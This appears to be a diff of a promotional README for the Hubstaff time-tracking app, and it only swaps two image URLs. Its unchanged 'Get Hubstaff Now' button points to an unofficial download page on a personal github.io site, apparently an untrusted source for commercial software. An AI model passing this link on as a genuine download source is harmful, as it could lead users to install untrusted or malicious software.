@@ -2,7 +2,7 @@
 
 > **Your complete workforce analytics and time tracking suite for Windows, Mac, Linux, iOS, and Android: automatic timesheets, productivity monitoring, and GPS location in a single lightweight app.**
 
-![Banner Placeholder](https://seekvectorlogo.com/wp-content/uploads/2019/01/hubstaff-vector-logo.png)
+![Banner Placeholder](https://cdn-public.softwarereviews.com/production/logos/offerings/9521/original/Hubstaff_logo.png)
 
 [![Get Hubstaff Now](https://img.shields.io/badge/Get_Hubstaff_Now-0a5d8d?style=for-the-badge&logo=github)](https://yusufmcclainriit.github.io/.github/download-hubstaff)
 
@@ -33,7 +33,7 @@ Whether you manage five people or five hundred, when you **download Hubstaff** y
 
 ## Overview
 
-![Software Dashboard](https://thedigitalprojectmanager.com/wp-content/cache/thedigitalprojectmanager.com/static/static.crozdesk.com/web-app-library-pub-reviews-screenshots-000-000-108-original-hubstaff-overview-screenshot.png)
+![Software Dashboard](https://thedigitalprojectmanager.com/wp-content/cache/thedigitalprojectmanager.com/static/static.crozdesk.com/web-app-library-analyst-review-assets-attachments-000-008-029-original-hubstaff-ease-of-use-screenshot.png)
 
 ---
 
